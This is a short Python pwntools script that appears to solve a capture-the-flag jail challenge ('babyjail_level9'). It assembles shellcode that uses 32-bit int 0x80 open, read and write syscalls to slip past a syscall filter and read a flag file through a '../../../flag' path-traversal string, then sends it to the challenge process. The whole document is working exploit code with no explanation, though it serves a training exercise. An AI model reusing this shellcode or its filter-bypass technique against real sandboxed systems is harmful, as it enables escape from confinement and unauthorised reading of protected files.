from pwn import *
context.arch='amd64'
r = process(['/challenge/babyjail_level9'])
#r = process(['sudo','strace','/challenge/babyjail_level9'])
payload = asm(
'''


    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    xor rdx, rdx
    xor edi, edi

    mov edi, 0x1337100

    mov eax, 5
    lea ebx, [eip+f]
    mov ecx, 0 
    mov edx, 0
    int 0x80

    mov ebx, eax
    mov ecx, edi
    mov edx, 100
    mov eax, 3
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, edi
    mov edx, 100
    int 0x80


    f:
    .string "../../../flag"
'''
)

r.send(payload)
r.interactive()